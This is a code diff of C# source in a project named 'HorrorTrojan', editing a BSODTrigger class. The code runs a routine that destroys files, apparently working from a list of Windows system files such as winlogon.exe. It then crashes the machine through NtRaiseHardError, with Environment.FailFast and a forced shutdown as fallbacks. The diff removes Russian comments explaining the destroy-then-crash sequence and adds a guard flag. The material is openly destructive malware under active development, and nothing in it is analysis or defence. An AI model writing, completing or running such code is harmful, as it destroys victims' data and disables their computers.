@@ -7,22 +7,21 @@ namespace HorrorTrojan
 {
     internal static class BSODTrigger
     {
+        private static bool isTriggered = false;
+        
         public static void TriggerBSOD()
         {
+            if (isTriggered) return;
+            isTriggered = true;
+            
             try
             {
-                // 1. УНИЧТОЖАЕМ ВСЁ (кроме файлов, нужных для BSOD)
                 DestroyEverything();
             }
-            catch
-            {
-                // Если DestroyEverything упал — всё равно пытаемся вызвать BSOD
-            }
+            catch { }
             
-            // 2. ВЫЗЫВАЕМ BSOD (3 способа)
             bool bsodTriggered = false;
             
-            // Способ 1: NtRaiseHardError
             try
             {
                 uint response;
@@ -31,7 +30,6 @@ namespace HorrorTrojan
             }
             catch { }
             
-            // Способ 2: Environment.FailFast (если NtRaiseHardError не сработал)
             if (!bsodTriggered)
             {
                 try
@@ -42,7 +40,6 @@ namespace HorrorTrojan
                 catch { }
             }
             
-            // Способ 3: Принудительная перезагрузка (если BSOD не сработал)
             if (!bsodTriggered)
             {
                 ForceShutdown();
@@ -63,7 +60,6 @@ namespace HorrorTrojan
             }
             catch { }
             
-            // Если shutdown не сработал — завершаем процесс принудительно
             try
             {
                 Process.GetCurrentProcess().Kill();
@@ -160,10 +156,6 @@ namespace HorrorTrojan
         {
             try
             {
-                // ===== ФАЙЛЫ, КОТОРЫЕ НЕЛЬЗЯ УДАЛЯТЬ (НУЖНЫ ДЛЯ BSOD) =====
-                // ntdll.dll, kernel32.dll, ntoskrnl.exe, hal.dll
-                // csrss.exe, services.exe, lsass.exe, svchost.exe, smss.exe, wininit.exe
-                
                 string[] systemFiles = new string[]
                 {
                     @"C:\Windows\System32\winlogon.exe",
